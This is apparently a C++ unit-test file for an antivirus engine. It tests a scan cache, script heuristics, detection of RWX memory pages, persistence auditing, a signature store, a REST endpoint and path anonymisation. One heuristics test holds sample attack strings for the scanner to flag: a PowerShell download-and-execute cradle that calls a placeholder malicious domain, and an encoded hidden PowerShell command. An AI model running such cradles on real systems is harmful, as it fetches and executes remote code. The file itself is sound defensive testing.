#include "TestHarness.h"
#include "../../common/Crypto.h"
#include "../../service/RealTimeProtection.h"
#include "../../service/ProcessMemoryAuditor.h"
#include "../../service/PersistenceAuditor.h"
#include "../../service/Scanner.h"
#include "../SignatureStore.h"
#include "../SignatureUpdater.h"
#include "../GrpcServer.h"
#include "../ScheduledScanService.h"
#include <filesystem>

#include <windows.h>
#include <chrono>

using namespace vantor;
using namespace vantor::rtp;
using namespace vantor::audit;
using namespace vantor::scan;

TEST(AdvancedSecurityTests, RtpCleanCacheLruAndSpeed) {
    std::cout << "[DEBUG] Starting RtpCleanCacheLruAndSpeed\n" << std::flush;
    RtpCleanCache cache(10);

    // Initial lookups on empty cache
    ScanVerdict v = ScanVerdict::Malicious;
    EXPECT_FALSE(cache.Lookup("nonexistent", v));

    // Insert 10 clean entries
    for (int i = 0; i < 10; ++i) {
        cache.Insert("file_" + std::to_string(i), ScanVerdict::Clean);
    }
    EXPECT_EQ(cache.Size(), 10ULL);

    // Verify lookup hits
    EXPECT_TRUE(cache.Lookup("file_0", v));
    EXPECT_EQ(v, ScanVerdict::Clean);

    // Insert 11th entry to trigger eviction of least recently used
    cache.Insert("file_10", ScanVerdict::Clean);
    EXPECT_EQ(cache.Size(), 10ULL);

    // Since file_0 was recently looked up, file_1 should be the oldest and evicted
    EXPECT_FALSE(cache.Lookup("file_1", v));
    EXPECT_TRUE(cache.Lookup("file_0", v));
    EXPECT_TRUE(cache.Lookup("file_10", v));

    // Performance benchmark: 10,000 rapid lookups should complete in sub-millisecond range
    auto start = std::chrono::high_resolution_clock::now();
    for (int i = 0; i < 10000; ++i) {
        cache.Lookup("file_0", v);
    }
    auto elapsed = std::chrono::duration_cast<std::chrono::microseconds>(
        std::chrono::high_resolution_clock::now() - start).count();

    // Average lookup must be sub-microsecond (< 1.0 us per lookup)
    double usPerLookup = static_cast<double>(elapsed) / 10000.0;
    EXPECT_LT(usPerLookup, 5.0); // Generous 5us boundary in test environment
}

TEST(AdvancedSecurityTests, ScriptAndLolbinHeuristics) {
    // 1. Dynamic download and execution cradle in PowerShell
    std::string cradlePs1 = "$wc = New-Object Net.WebClient; IEX($wc.DownloadString('http://evil-domain.com/loader.exe'));";
    std::vector<uint8_t> cradleBuf(cradlePs1.begin(), cradlePs1.end());
    double cradleScore = Scanner::CalculateHeuristicScore("C:\\Users\\Victim\\Downloads\\update.ps1", cradleBuf);
    EXPECT_GE(cradleScore, 0.70);

    // 2. Encoded hidden execution cradle
    std::string encPs1 = "powershell.exe -w hidden -enc JAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAA=";
    std::vector<uint8_t> encBuf(encPs1.begin(), encPs1.end());
    double encScore = Scanner::CalculateHeuristicScore("C:\\Users\\Victim\\Desktop\\invoice.bat", encBuf);
    EXPECT_GE(encScore, 0.60);

    // 3. Benign harmless administrative script
    std::string cleanPs1 = "Write-Host 'System backup started'; Get-Date; $status = 0;";
    std::vector<uint8_t> cleanBuf(cleanPs1.begin(), cleanPs1.end());
    double cleanScore = Scanner::CalculateHeuristicScore("C:\\Scripts\\backup.ps1", cleanBuf);
    EXPECT_LE(cleanScore, 0.35);
}

TEST(AdvancedSecurityTests, ProcessMemoryAuditorDetectsUnbackedRwx) {
    std::vector<MemoryAnomaly> anomalies;
    uint64_t regions = 0;

    // Allocate an unbacked private RWX page in the current process
    void* rwxMem = VirtualAlloc(nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    ASSERT_NE(rwxMem, nullptr);

    // Write a dummy NOP sled shellcode pattern
    memset(rwxMem, 0x90, 4096);

    bool detected = ProcessMemoryAuditor::AuditProcessHandle(
        GetCurrentProcess(), GetCurrentProcessId(), "VantorTests.exe",
        "C:\\VantorTests.exe", anomalies, regions
    );

    // Free the RWX test allocation
    VirtualFree(rwxMem, 0, MEM_RELEASE);

    EXPECT_TRUE(detected);
    EXPECT_GE(anomalies.size(), 1ULL);

    bool foundRwx = false;
    for (const auto& a : anomalies) {
        if (a.protection.find("PAGE_EXECUTE_READWRITE") != std::string::npos &&
            a.anomalyType == "UNBACKED_RWX_PAGE") {
            foundRwx = true;
            break;
        }
    }
    EXPECT_TRUE(foundRwx);
}

TEST(AdvancedSecurityTests, PersistenceAuditorPathExtractionAndAudit) {
    // 1. Quoted path extraction
    std::string cmd1 = "\"C:\\Program Files\\Security\\monitor.exe\" --service --silent";
    EXPECT_EQ(PersistenceAuditor::ExtractExecutablePath(cmd1), "C:\\Program Files\\Security\\monitor.exe");

    // 2. Unquoted path
    std::string cmd2 = "C:\\Windows\\system32\\cmd.exe /c start";
    EXPECT_EQ(PersistenceAuditor::ExtractExecutablePath(cmd2), "C:\\Windows\\system32\\cmd.exe");

    // 3. Live Persistence Audit Execution
    auto report = PersistenceAuditor::Instance().AuditPersistence();
    EXPECT_TRUE(report.success);
    EXPECT_GE(report.totalAudited, 0ULL);
}

TEST(AdvancedSecurityTests, SignatureStoreRawByteContains) {
    std::string testDb = "test_raw.db";
    std::string testIdx = "test_raw.idx";
    std::error_code ec;
    std::filesystem::remove(testDb, ec);
    std::filesystem::remove(testIdx, ec);

    backend::SignatureStore store;
    EXPECT_TRUE(store.Initialize(testDb, testIdx));

    std::string testHex = "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899";
    EXPECT_TRUE(store.AddSignature(testHex));

    EXPECT_TRUE(store.Contains(testHex));

    std::vector<uint8_t> rawBytes;
    ASSERT_TRUE(crypto::HexToBytes(testHex, rawBytes));
    ASSERT_EQ(rawBytes.size(), 32ULL);

    EXPECT_TRUE(store.Contains(rawBytes.data()));

    // Non-existent hash
    uint8_t dummy[32] = {0xfe, 0xdc, 0xba};
    EXPECT_FALSE(store.Contains(dummy));

    store.Close();
    std::filesystem::remove(testDb, ec);
    std::filesystem::remove(testIdx, ec);
}

TEST(AdvancedSecurityTests, GrpcServerRestAndOpenApi) {
    backend::GrpcServerOptions opts;
    opts.port = 50099;
    backend::VantorGrpcServer server(opts);

    int status = 0;
    std::string openApiResp = server.ProcessRest("GET", "/api/v1/openapi.json", "", "", status);
    EXPECT_EQ(status, 200);
    EXPECT_NE(openApiResp.find("Vantor Antivirus Remote Management API"), std::string::npos);

    std::string statusResp = server.ProcessRest("GET", "/api/v1/status", "", "", status);
    EXPECT_EQ(status, 200);
    EXPECT_NE(statusResp.find("total_signatures"), std::string::npos);
}

TEST(AdvancedSecurityTests, AnonymizePathGdprCompliance) {
    std::string userPath = "C:\\Users\\AliceJohnson\\Downloads\\installer.exe";
    std::string anonymized = AnonymizePath(userPath);
    EXPECT_EQ(anonymized, "C:\\Users\\<redacted>\\Downloads\\installer.exe");

    std::string sysPath = "C:\\Windows\\System32\\notepad.exe";
    EXPECT_EQ(AnonymizePath(sysPath), sysPath);
}
